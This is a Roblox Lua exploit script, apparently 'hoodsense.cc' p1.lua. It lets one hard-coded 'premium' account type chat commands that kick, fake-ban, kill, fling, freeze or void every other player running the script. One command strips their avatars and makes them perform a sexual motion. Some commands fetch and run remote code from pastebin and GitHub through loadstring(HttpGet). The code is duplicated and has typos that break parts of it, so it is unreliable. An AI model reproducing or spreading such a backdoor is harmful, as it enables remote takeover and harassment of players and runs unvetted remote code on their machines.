local premium2 = game.Players.qcnqy
local Players = game:GetService("Players")
	Players.PlayerAdded:Connect(function(player)
		print("[hoodsense.cc] p1.lua found " .. player.Name)
		local premium2 = game.Players.qcnqy
-----------------------------------// Premium User //--------------------------------------
local premium2 = game.Players.qcnqy
-------------------------------------------------------------------------------------------
local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

premium2.Chatted:connect(function(cht)
	if cht:match("$kick .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer:Kick("Kicked by Premium user")
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$fling .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 99999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$benx .") then
		if game.Players.LocalPlayer ~= premium2 then
			wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = premium2.Character.HumanoidRootPart
			local benxed = true
			while benxed == true do
				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
				pcall(function()
    					hummy.Parent.Pants:Destroy()
				end)
				pcall(function()
    					hummy.Parent.Shirt:Destroy()
				end)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = premium2.Character.HumanoidRootPart.CFrame + premium2.Character.HumanoidRootPart.CFrame.lookVector * 0.5
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
				wait(0.1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
			end
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$unbenx .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
			wait(15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium2.Character.UpperTorso.Position)
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$freeze .") then
		if game.Players.LocalPlayer ~= premium2 then
			freeze()
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$unfreeze .") then
		if game.Players.LocalPlayer ~= premium2 then
			unfreeze()
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$thaw .") then
		if game.Players.LocalPlayer ~= premium2 then
			unfreeze()
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$ban .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer:kick("PERMA BAN")
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$kill .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$rejoin .") then
    	if game.Players.LocalPlayer ~= premium2 then
        loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
        end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$void .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$bring .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium2.Character.UpperTorso.Position)
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$grave .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$ungrave .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("/e test") then
		if game.Players.LocalPlayer ~= premium2 then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes yes sir ;)","All")
		end
	end

end)


 end)
	Players.PlayerRemoving:Connect(function(player)
	print("[hoodsense.cc] [hoodsense.cc] p1.lua lost " .. player.Name)
	local premium2 = game.Players.qcnqy
-----------------------------------// Premium User //--------------------------------------
local premium2 = game.Players.qcnqy
-------------------------------------------------------------------------------------------
local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

premium2.Chatted:connect(function(cht)
	if cht:match("$kick .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer:Kick("Kicked by Premium user")
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$fling .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 99999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$benx .") then
		if game.Players.LocalPlayer ~= premium2 then
			wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = premium2.Character.HumanoidRootPart
			local benxed = true
			while benxed == true do
				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
				pcall(function()
    					hummy.Parent.Pants:Destroy()
				end)
				pcall(function()
    					hummy.Parent.Shirt:Destroy()
				end)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = premium2.Character.HumanoidRootPart.CFrame + premium2.Character.HumanoidRootPart.CFrame.lookVector * 0.5
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
				wait(0.1)
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
			end
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$unbenx .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
			wait(15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium2.Character.UpperTorso.Position)
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$freeze .") then
		if game.Players.LocalPlayer ~= premium2 then
			freeze()
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$unfreeze .") then
		if game.Players.LocalPlayer ~= premium2 then
			unfreeze()
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$thaw .") then
		if game.Players.LocalPlayer ~= premium2 then
			unfreeze()
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$ban .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer:kick("PERMA BAN")
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$kill .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$rejoin .") then
    	if game.Players.LocalPlayer ~= premium2 then
        loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
        end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$void .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$bring .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium2.Character.UpperTorso.Position)
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$grave .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$ungrave .") then
		if game.Players.LocalPlayer ~= premium2 then
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("/e test") then
		if game.Players.LocalPlayer ~= premium2 then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes yes sir ;)","All")
		end
	end

end)

premium2.Chatted:connect(function(cht)
	if cht:match("$dropcash .") then
    	if game.Players.LocalPlayer ~= premium2 then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
        end
	end

end)

end)
-------------------------------------------------------------------------------
